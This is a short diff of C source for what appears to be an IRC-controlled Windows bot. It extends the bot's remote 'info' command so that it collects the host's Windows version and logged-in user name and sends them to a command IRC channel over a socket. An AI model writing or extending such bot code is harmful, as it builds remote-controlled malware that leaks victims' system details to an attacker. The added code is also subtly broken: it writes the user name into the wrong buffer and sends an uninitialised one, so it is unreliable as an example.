@@ -78,14 +78,21 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					}
 					else if (strstr(cmd, "info"))
 					{
-						char kern[256];
+						char info[512];
 
 						OSVERSIONINFO kern_info;
 						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 						GetVersionEx(&kern_info);
-						_snprintf(kern, 256, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
-						
-						send(socket, kern, strlen(kern), 0);
+						_snprintf(info, 512, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
+						send(socket, info, strlen(info), 0);
+						ZeroMemory(info, 512);
+
+						char username[128];
+						int username_sz = 128;
+						GetUserName(info, &username_sz);
+						_snprintf(info, 512, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, username);
+						send(socket, info, strlen(info), 0);
+						ZeroMemory(info, 512);
 					}
 					else if (strstr(cmd, "popup"))
 					{
